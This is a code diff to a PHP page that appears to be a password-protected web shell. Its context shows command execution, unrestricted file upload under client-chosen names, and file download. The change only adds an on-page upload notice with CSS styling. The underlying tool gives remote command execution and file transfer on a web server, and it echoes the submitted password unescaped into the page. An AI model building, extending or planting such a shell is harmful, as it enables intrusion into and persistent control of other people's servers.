@@ -10,6 +10,7 @@ $authenticated = false;
 $error = ''; // Error message variable
 $cmd_output = ''; // Variable to hold command output
 $download_error = ''; // Error variable for file download
+$upload_info = ''; // Info variable for file upload
 
 if (isset($_POST['password'])) {
     if ($_POST['password'] === $password) {
@@ -23,7 +24,7 @@ if (isset($_POST['password'])) {
         // File upload feature
         if (isset($_FILES['file'])) {
             move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
-            echo "File uploaded successfully!";
+            $upload_info = "File uploaded successfully!";
         }
 
         // File download feature
@@ -81,6 +82,14 @@ if (isset($_POST['password'])) {
             margin-top: 20px;
             font-size: 18px;
         }
+
+        .upload {
+            color: green;
+            margin-bottom: 20px;
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        
         .cmd-output {
             background-color: #f0f0f0;
             padding: 10px;
@@ -131,6 +140,11 @@ if (isset($_POST['password'])) {
                 <input type="submit" value="Execute">
             </form>
 
+            <!-- Display the file upload notification if exists -->
+            <div class="upload">
+                <?php echo $upload_info ? $upload_info : ''; ?>
+            </div>
+        
             <!-- File upload form -->
             <form method="POST" enctype="multipart/form-data" style="font-size: 20px;">
                 <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
